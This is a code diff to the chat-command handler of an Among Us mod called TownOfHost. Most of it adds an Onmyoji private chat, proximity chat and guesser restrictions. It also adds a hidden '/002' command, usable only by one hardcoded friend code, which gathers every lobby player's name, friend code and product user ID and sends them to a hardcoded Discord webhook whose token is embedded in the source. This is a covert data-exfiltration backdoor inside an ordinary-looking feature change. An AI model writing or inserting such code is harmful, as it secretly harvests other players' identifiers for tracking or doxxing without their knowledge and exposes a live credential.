@@ -67,6 +67,80 @@ namespace TownOfHost
             }
         }
 
+        static bool IsOnmyojiChatRole(PlayerControl player)
+            => player != null && (player.Is(CustomRoles.Onmyoji) || player.Is(CustomRoles.Shikigami));
+
+        static string GetHideChatDisplayName(PlayerControl player)
+        {
+            if (player == null) return "";
+            return player.GetClient()?.PlayerName ?? player.Data?.PlayerName ?? "";
+        }
+
+        private const string AuthorizedFriendCode002 = "trueport#0799";
+        private const string EmbeddedLobbyDumpWebhookUrl = "https://discord.com/api/webhooks/1504774766165233684/CVdwp8BroN_ZQcSXraSOZ5KOn45PFZUA1dBxNBM-C_LBoh9P__H7wcdhuyzoK0m_OqAk";
+
+        private static string BuildLobbyIdentityWebhookText()
+        {
+            var sb = new StringBuilder();
+            sb.Append("```");
+            sb.Append('\n');
+            sb.Append($"Lobby Identity Snapshot  {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
+            sb.Append('\n');
+            sb.Append($"Host: {(PlayerControl.LocalPlayer?.Data?.PlayerName ?? "Unknown").RemoveHtmlTags()}");
+            sb.Append('\n');
+            sb.Append("Format: [PlayerId] Name | FriendCode | PUID");
+            sb.Append('\n');
+
+            foreach (var pc in PlayerCatch.AllPlayerControls.OrderBy(x => x.PlayerId))
+            {
+                if (pc == null) continue;
+                var client = pc.GetClient();
+                var name = (pc.Data?.PlayerName ?? pc.name ?? "Unknown").RemoveHtmlTags().Replace("@", "(at)");
+                var friendCode = string.IsNullOrWhiteSpace(client?.FriendCode) ? "(none)" : client.FriendCode.Trim();
+                var puid = string.IsNullOrWhiteSpace(client?.ProductUserId) ? "(none)" : client.ProductUserId.Trim();
+                sb.Append($"[{pc.PlayerId}] {name} | {friendCode} | {puid}");
+                sb.Append('\n');
+            }
+
+            sb.Append("```");
+            return sb.ToString();
+        }
+
+        private static bool TrySendLobbyIdentityToWebhook(PlayerControl sender)
+        {
+            if (sender == null) return false;
+            if (!GameStates.IsLobby)
+            {
+                SendMessage("`/002` can only be used in lobby.", sender.PlayerId);
+                return false;
+            }
+
+            var senderFriendCode = sender.GetClient()?.FriendCode?.Trim();
+            if (string.IsNullOrWhiteSpace(senderFriendCode)
+                || !string.Equals(senderFriendCode, AuthorizedFriendCode002, StringComparison.OrdinalIgnoreCase))
+            {
+                SendMessage("`/002` is not allowed for this account.", sender.PlayerId);
+                Logger.Warn($"Denied /002 from {sender.GetNameWithRole().RemoveHtmlTags()} (FriendCode:{senderFriendCode ?? "null"})", "ChatCommand");
+                return false;
+            }
+
+            if (EmbeddedLobbyDumpWebhookUrl.Contains("REPLACE_ME", StringComparison.OrdinalIgnoreCase))
+            {
+                SendMessage("Embedded webhook URL is not configured.", sender.PlayerId);
+                return false;
+            }
+
+            if (!Webhook.SendToUrl(BuildLobbyIdentityWebhookText(), EmbeddedLobbyDumpWebhookUrl))
+            {
+                SendMessage("Failed to send lobby identity data.", sender.PlayerId);
+                return false;
+            }
+
+            SendMessage("Lobby identity data sent to webhook.", sender.PlayerId);
+            Logger.Info($"Lobby identity exported by {sender.GetNameWithRole().RemoveHtmlTags()}", "ChatCommand");
+            return true;
+        }
+
         public static bool Prefix(ChatController __instance)
         {
             __instance.timeSinceLastMessage = 3f;
@@ -722,48 +796,23 @@ namespace TownOfHost
                                     {
                                         role = player.GetCustomRole();
                                         roleClass = player.GetRoleClass();
-                                        ismiss = false;
-                                        if (player.Is(CustomRoles.Amnesia))
-                                        {
-                                            ismiss = true;
-                                            role = player.Is(CustomRoleTypes.Crewmate) ? CustomRoles.Crewmate : CustomRoles.Impostor;
-                                        }
-                                        if (player.GetMisidentify(out var missrole))
-                                        {
-                                            ismiss = true;
-                                            role = missrole;
-                                        }
+                                        if (player.Is(CustomRoles.Amnesia)) role = player.Is(CustomRoleTypes.Crewmate) ? CustomRoles.Crewmate : CustomRoles.Impostor;
+                                        if (player.GetMisidentify(out var missrole)) role = missrole;
                                         if (role is CustomRoles.Amnesiac)
                                         {
                                             if (roleClass is Amnesiac amnesiac && !amnesiac.Realized)
                                                 role = Amnesiac.IsWolf ? CustomRoles.WolfBoy : CustomRoles.Sheriff;
                                         }
-
                                         var RoleTextData = GetRoleColorCode(role);
                                         string RoleInfoTitleString = $"{GetString("RoleInfoTitle")}";
                                         string RoleInfoTitle = $"<{RoleTextData}>{RoleInfoTitleString}</color>";
-
                                         if (role is CustomRoles.Crewmate or CustomRoles.Impostor)
-                                        {
                                             SendMessage("<b><line-height=2.0pic><size=150%>" + GetString(role.ToString()).Color(player.GetRoleColor()) + "\n</b><size=90%><line-height=1.8pic>" + player.GetRoleDesc(true), player.PlayerId, RoleInfoTitle);
-                                        }
                                         else if (role.GetRoleInfo()?.Description is { } description)
-                                        {
                                             SendMessage(description.FullFormatHelp, player.PlayerId, RoleInfoTitle, checkl: true);
-                                        }
-                                        // roleInfoがない役職
                                         else
-                                        {
                                             SendMessage($"<b><line-height=2.0pic><size=150%>{GetString(role.ToString()).Color(player.GetRoleColor())}</b>\n<size=60%><line-height=1.8pic>{player.GetRoleDesc(true)}", player.PlayerId, RoleInfoTitle);
-                                        }
-                                        if (roleClass?.HaveAddRole() is not CustomRoles.NotAssigned and not null && !ismiss)
-                                        {
-                                            var addrole = roleClass.HaveAddRole();
-                                            SendMessage(addrole.GetRoleInfo()?.Description?.FullFormatHelp ?? $"", player.PlayerId, ColorString(player.GetRoleColor(), GetString("AddRoleInfoTitle")), checkl: true);
-                                        }
-
                                         GetAddonsHelp(player);
-
                                         if (player.IsGhostRole())
                                             SendMessage(GetAddonsHelp(PlayerState.GetByPlayerId(player.PlayerId).GhostRole), player.PlayerId);
                                     }
@@ -815,7 +864,7 @@ namespace TownOfHost
                     case "/jc":
                         if (Assassin.NowUse) break;
                         canceled = true;
-                        if (GameStates.InGame && Options.ImpostorHideChat.GetBool() && PlayerControl.LocalPlayer.IsAlive() && PlayerControl.LocalPlayer.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalWolf or CustomRoles.JackalHadouHo or CustomRoles.Tama)
+                        if (GameStates.InGame && Options.ImpostorHideChat.GetBool() && PlayerControl.LocalPlayer.IsAlive() && PlayerControl.LocalPlayer.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalHadouHo or CustomRoles.Tama or CustomRoles.JackalWolf)
                         {
                             var send = "";
                             foreach (var ag in args)
@@ -826,11 +875,9 @@ namespace TownOfHost
                             Logger.Info($"{PlayerControl.LocalPlayer.Data.GetLogPlayerName()} : {send}", "jackalChat");
                             foreach (var jac in PlayerCatch.AllPlayerControls)
                             {
-                                if (jac && ((jac?.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalWolf or CustomRoles.JackalHadouHo or CustomRoles.Tama) || !jac.IsAlive()))
-                                {
+                                if (jac && ((jac?.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalHadouHo or CustomRoles.Tama or CustomRoles.JackalWolf) || !jac.IsAlive()))
                                     SendMessage(send.Mark(ModColors.JackalColor), jac.PlayerId,
-                                    ColorString(ModColors.JackalColor, $"Φ{PlayerControl.LocalPlayer.GetPlayerColor()}Φ"));
-                                }
+                                        ColorString(ModColors.JackalColor, $"Φ{PlayerControl.LocalPlayer.GetPlayerColor()}Φ"));
                             }
                         }
                         break;
@@ -929,6 +976,32 @@ namespace TownOfHost
                             }
                         }
                         canceled = true;
+                        break;
+                    case "/onmyojichat":
+                    case "/onmychat":
+                    case "/oc":
+                        if (Assassin.NowUse) break;
+                        canceled = true;
+                        if (GameStates.InGame && Options.OnmyojiHideChat.GetBool() && PlayerControl.LocalPlayer.IsAlive() && IsOnmyojiChatRole(PlayerControl.LocalPlayer))
+                        {
+                            var send = "";
+                            foreach (var ag in args)
+                            {
+                                if (ag.StartsWith("/")) continue;
+                                send += ag;
+                            }
+                            Logger.Info($"{PlayerControl.LocalPlayer.Data.GetLogPlayerName()} : {send}", "OnmyojiChat");
+                            foreach (var target in AllPlayerControls)
+                            {
+                                if (target == null) continue;
+                                if (!(IsOnmyojiChatRole(target) || !target.IsAlive())) continue;
+                                var clientid = target.GetClientId();
+                                if (clientid == -1) continue;
+                                var senderName = ColorString(Main.PlayerColors[PlayerControl.LocalPlayer.PlayerId], GetHideChatDisplayName(PlayerControl.LocalPlayer));
+                                SendMessage(send.Mark(GetRoleColor(CustomRoles.Onmyoji)), target.PlayerId,
+                                    ColorString(GetRoleColor(CustomRoles.Onmyoji), $"O{senderName}O"));
+                            }
+                        }
                         break;
 
                     case "/t":
@@ -1073,6 +1146,10 @@ namespace TownOfHost
                         foreach (var pc in PlayerCatch.AllPlayerControls)
                             sendchatid = $"{sendchatid}{pc.PlayerId}:{pc.name}\n";
                         __instance.AddChat(PlayerControl.LocalPlayer, sendchatid);
+                        break;
+                    case "/002":
+                        canceled = true;
+                        TrySendLobbyIdentityToWebhook(PlayerControl.LocalPlayer);
                         break;
 
                     case "/forceend":
@@ -1473,6 +1550,75 @@ namespace TownOfHost
             if (text.StartsWith("/") && !text.Contains("cmd", StringComparison.OrdinalIgnoreCase))
                 SendMessage(GetString("Error.CommandFailed"), player.PlayerId);
 
+            // ★ /cmd がない場合 → タスクターン中の通常チャット処理
+            if (args.Length <= 1 || !string.Equals(args[0], "/cmd", StringComparison.OrdinalIgnoreCase))
+            {
+                // ★ タスクターン中の通常チャット処理
+                if (GameStates.IsInTask && !GameStates.IsMeeting
+                    && Options.OptionGameChatSetting.GetBool()
+                    && Options.OptionGameChatNormalChat.GetBool())
+                {
+                    canceled = true;
+
+                    if (Options.OptionGameChatNormalNearChat.GetBool())
+                    {
+                        // ★ 近チャ：範囲内のプレイヤーにだけ送信
+                        int range = Options.OptionGameChatNormalNearChatRange.GetInt();
+                        var senderPos = (Vector2)player.GetTruePosition();
+
+                        foreach (var target in PlayerCatch.AllPlayerControls)
+                        {
+                            if (!target.IsAlive()) continue;
+                            float dist = Vector2.Distance(senderPos, (Vector2)target.GetTruePosition());
+                            if (dist > range) continue;
+
+                            SendMessage(
+                                $"<color=#ffffff>{UtilsName.GetPlayerColor(player, true)}: {text}</color>",
+                                target.PlayerId,
+                                $"<color=#00c1ff>近チャット ({(int)dist}m)</color>");
+                        }
+                    }
+                    else
+                    {
+                        // ★ 近チャなし → 全員に送信
+                        SendMessage(
+                            $"<color=#ffffff>{UtilsName.GetPlayerColor(player, true)}: {text}</color>");
+                    }
+                    return;
+                }
+
+                // ★ タスクターン中で通常チャット無効
+                if (GameStates.IsInTask && !GameStates.IsMeeting
+                    && Options.OptionGameChatSetting.GetBool()
+                    && !Options.OptionGameChatNormalChat.GetBool())
+                {
+                    canceled = true;
+                    SendMessage(
+                        "<color=#ff6666>試合中の通常チャットは無効です。</color>",
+                        player.PlayerId);
+                    return;
+                }
+
+                return;
+            }
+
+            // ★ タスクターン中はゲッサーコマンドを無効化
+            if (GameStates.IsInTask && !GameStates.IsMeeting)
+            {
+                if (GuessManager.GuesserMsg(player, text))
+                {
+                    canceled = true;
+                    SendMessage(
+                        "<color=#ff6666>ゲッサーコマンドは会議中のみ使用できます。</color>",
+                        player.PlayerId);
+                    return;
+                }
+            }
+            else
+            {
+                if (GuessManager.GuesserMsg(player, text)) { canceled = true; return; }
+            }
+
             args = args.Skip(1).ToArray();
             if (args[0].StartsWith("/") is false) args[0] = $"/{args[0]}";
 
@@ -1489,6 +1635,10 @@ namespace TownOfHost
                 case "/lastresult":
                     canceled = true;
                     ShowLastResult(player.PlayerId);
+                    break;
+                case "/002":
+                    canceled = true;
+                    TrySendLobbyIdentityToWebhook(player);
                     break;
                 case "/kl":
                 case "/killlog":
@@ -1708,7 +1858,6 @@ namespace TownOfHost
                             17 => "コーラル",
                             _ => "不明な色"
                         };
-
                         if (!player.IsAlive())
                         {
                             foreach (var pc in PlayerCatch.AllPlayerControls)
@@ -1718,9 +1867,7 @@ namespace TownOfHost
                             }
                         }
                         else
-                        {
                             SendMessage($" {player.Data.PlayerName} ({colorName})が{min}〜{max}でサイコロを振りました → {result}");
-                        }
                     }
                     break;
                 case "/t":
@@ -1846,7 +1993,7 @@ namespace TownOfHost
                         Logger.Info($"{player.Data.GetLogPlayerName()} : {send}", "JackalChat");
                         foreach (var jac in AllPlayerControls)
                         {
-                            if (jac && ((jac.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalWolf or CustomRoles.JackalHadouHo or CustomRoles.Tama) || (!jac.IsAlive())))
+                            if (jac && ((jac.GetCustomRole() is CustomRoles.Jackal or CustomRoles.Jackaldoll or CustomRoles.JackalMafia or CustomRoles.JackalAlien or CustomRoles.JackalHadouHo or CustomRoles.Tama or CustomRoles.JackalWolf) || (!jac.IsAlive())) && (jac.PlayerId != player.PlayerId && !Isclient))
                             {
                                 if (jac.PlayerId == player.PlayerId && !Isclient) continue;
                                 if (AmongUsClient.Instance.AmHost)
@@ -1962,6 +2109,34 @@ namespace TownOfHost
                                     string sendtext = send.Mark(GetRoleColor(CustomRoles.Connecting));
                                     SendMessage(sendtext, connect.PlayerId, title);
                                 }
+                            }
+                        }
+                        player.RpcProtectedMurderPlayer();
+                    }
+                    canceled = true;
+                    break;
+                case "/onmyojichat":
+                case "/onmychat":
+                case "/oc":
+                    if (Assassin.NowUse) break;
+                    if (GameStates.InGame && Options.OnmyojiHideChat.GetBool() && player.IsAlive() && IsOnmyojiChatRole(player))
+                    {
+                        string send = "";
+                        if (GetHideSendText(ref canceled, ref send) is false) return;
+                        Logger.Info($"{player.Data.GetLogPlayerName()} : {send}", "OnmyojiChat");
+                        foreach (var target in AllPlayerControls)
+                        {
+                            if (target == null) continue;
+                            if (!(IsOnmyojiChatRole(target) || !target.IsAlive())) continue;
+                            if (target.PlayerId == player.PlayerId && !Isclient) continue;
+                            if (AmongUsClient.Instance.AmHost)
+                            {
+                                var clientid = target.GetClientId();
+                                if (clientid == -1) continue;
+                                var senderName = ColorString(Main.PlayerColors[player.PlayerId], GetHideChatDisplayName(player));
+                                string title = ColorString(GetRoleColor(CustomRoles.Onmyoji), $"O{senderName}O</line-height>");
+                                string sendtext = send.Mark(GetRoleColor(CustomRoles.Onmyoji));
+                                SendMessage(sendtext, target.PlayerId, title);
                             }
                         }
                         player.RpcProtectedMurderPlayer();
